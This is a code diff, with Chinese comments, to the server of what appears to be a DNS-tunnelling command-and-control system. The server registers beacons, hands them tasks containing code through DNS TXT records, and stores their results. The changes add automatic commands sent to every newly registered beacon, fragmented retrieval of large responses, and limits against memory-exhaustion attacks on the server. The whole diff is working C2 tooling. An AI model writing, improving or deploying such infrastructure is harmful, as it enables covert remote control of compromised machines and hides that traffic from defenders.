@@ -17,12 +17,15 @@ import time
 
 from server.core.crypto import encode_frame, decode_frame
 from server.core.protocol import (REGISTER, RESULT, WELCOME, PONG, TASK,
-                                  validate_message, BAD_JSON)
-from server.core.events import EVT_CONNECT, EVT_TASK_RESULT
-from server.client_manager import TaskResult
+                                  validate_message)
+from server.sessions.engine import (
+    register_beacon, store_result, build_auto_tasks, InFlight,
+)
 
 _CACHE_TTL = 60.0     # 分片缓存存活上限（M2）
 _CACHE_MAX = 512      # 分片缓存条目上限（M2：防内存耗尽）
+_RESP_SPLIT_LIMIT = 40  # 单 UDP 报文最多回传的 TXT 分片数（超出改逐片拉取）
+_MAX_FRAGMENTS = 12000  # 请求方向单帧最大分片数（防越界序号/超大 total 撑爆内存）
 
 
 def _b32e(data: bytes) -> str:
@@ -80,7 +83,8 @@ def build_txt_response(qid: bytes, labels: list, qtype: int,
 class _DnsServer:
     """UDP DNS 服务：解析查询 → 无状态协议处理 → TXT 响应。"""
 
-    def __init__(self, host, port, key, mgr, tq, events):
+    def __init__(self, host, port, key, mgr, tq, events,
+                 config=None, smods=None, dispatcher=None):
         self._sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self._sock.bind((host, port))
@@ -89,7 +93,12 @@ class _DnsServer:
         self._mgr = mgr
         self._tq = tq
         self._events = events
+        self._config = config
+        self._smods = smods
+        self._dispatcher = dispatcher
+        self._inflight = InFlight()
         self._cache = {}            # 分片请求缓存: bid -> {seq: seg}
+        self._resp_cache = {}       # 分片响应缓存: bid -> (ts, [chunk, ...])
         self._running = False
         self._thread = threading.Thread(target=self._loop, daemon=True)
 
@@ -112,16 +121,39 @@ class _DnsServer:
             if bid and bid != "poll":
                 task = self._tq.pop(bid)
                 if task is not None:
+                    self._inflight.track(task)
                     resp = self._frame(
                         {"type": TASK, "task_id": task.task_id,
                          "code": task.code})
-            return self._txt_response(qid, labels, qtype, resp)
+            return self._txt_response(qid, labels, qtype, resp, bid)
+
+        # 响应分片拉取: r<idx>.<bid>.<domain...>（大响应改逐片拉取）
+        if labels[0].startswith("r") and labels[0][1:].isdigit():
+            # 惰性清理过期响应缓存（防大响应条目累积耗尽内存）
+            if len(self._resp_cache) > _CACHE_MAX:
+                now = time.time()
+                stale = [b for b, c in self._resp_cache.items()
+                         if now - c[0] > _CACHE_TTL]
+                for b in stale:
+                    self._resp_cache.pop(b, None)
+            idx = int(labels[0][1:])
+            bid = labels[1]
+            item = self._resp_cache.get(bid)
+            chunk = b""
+            if (item and time.time() - item[0] < _CACHE_TTL
+                    and 0 <= idx < len(item[1])):
+                chunk = item[1][idx].encode("ascii")
+            return build_txt_response(qid, labels, qtype, [chunk])
 
         # 数据分片: <seg>.<seq>.<total>.<bid>.<domain...>
         try:
             seg, seq_s, total_s, bid = labels[0], labels[1], labels[2], labels[3]
             seq, total = int(seq_s), int(total_s)
         except (ValueError, IndexError):
+            return build_txt_response(qid, labels, qtype, [b""])
+        # total 上限防内存耗尽；seq 越界（含负数）直接丢弃——否则一个
+        # 越界序号会撑高 dict 计数，令收齐判定误通过 → KeyError + cache 泄漏
+        if total <= 0 or total > _MAX_FRAGMENTS or not (0 <= seq < total):
             return build_txt_response(qid, labels, qtype, [b""])
         now = time.time()
         # M2：惰性清理过期缓存 + 条目上限（防攻击者用不完整分片耗尽内存）
@@ -150,29 +182,41 @@ class _DnsServer:
             return build_txt_response(qid, labels, qtype, [b""])
 
         if msg.get("type") == REGISTER:
-            bid2, is_new = self._mgr.register(
-                msg.get("id", ""), is_client=False)
-            self._events.emit(EVT_CONNECT, bid2, first=bool(is_new))
+            bid2, is_new = register_beacon(msg, self._mgr, self._events)
+            if is_new:
+                for task in build_auto_tasks(self._config.auto_commands,
+                                             bid2, self._dispatcher):
+                    self._tq.push(bid2, task)
             resp = self._frame({"type": WELCOME, "version": 1})
         elif msg.get("type") == RESULT:
-            self._mgr.add_result(bid, TaskResult(
-                task_id=msg.get("task_id", ""),
-                output=msg.get("output", ""),
-                error=msg.get("error", "")))
-            self._events.emit(EVT_TASK_RESULT, bid,
-                              task_id=msg.get("task_id", ""),
-                              output=str(msg.get("output", ""))[:200])
+            rp, pa = self._inflight.take(msg.get("task_id", ""))
+            store_result(bid, msg.get("task_id", ""),
+                         msg.get("output", ""), msg.get("error", ""),
+                         self._mgr, self._events,
+                         self._config.max_result_size,
+                         smods=self._smods, dispatcher=self._dispatcher,
+                         result_processor=rp, proc_arg=pa)
             resp = self._frame({"type": PONG})
         else:
             resp = self._frame({"type": PONG})
-        return self._txt_response(qid, labels, qtype, resp)
+        return self._txt_response(qid, labels, qtype, resp, bid)
 
-    def _txt_response(self, qid, labels, qtype, resp_frame: bytes) -> bytes:
-        """响应帧 → base32 分片 → 多条 TXT RR。"""
+    def _txt_response(self, qid, labels, qtype, resp_frame: bytes,
+                      bid: str = "") -> bytes:
+        """响应帧 → base32 分片 → 多条 TXT RR。
+
+        单个 UDP 报文（beacon 端 recv(4096)）装不下时：缓存分片并返回
+        s<total> 标记，beacon 用 r<idx> 查询逐片拉取，避免响应被静默截断。
+        """
         b32 = _b32e(resp_frame)
-        chunks = [b32[i:i + 60].encode("ascii")
-                  for i in range(0, len(b32), 60)]
-        return build_txt_response(qid, labels, qtype, chunks or [b""])
+        chunks = [b32[i:i + 60] for i in range(0, len(b32), 60)]
+        if bid and len(chunks) > _RESP_SPLIT_LIMIT:
+            self._resp_cache[bid] = (time.time(), chunks)
+            return build_txt_response(
+                qid, labels, qtype, [f"s{len(chunks)}".encode("ascii")])
+        return build_txt_response(
+            qid, labels, qtype,
+            [c.encode("ascii") for c in chunks] or [b""])
 
     def _loop(self):
         while self._running:
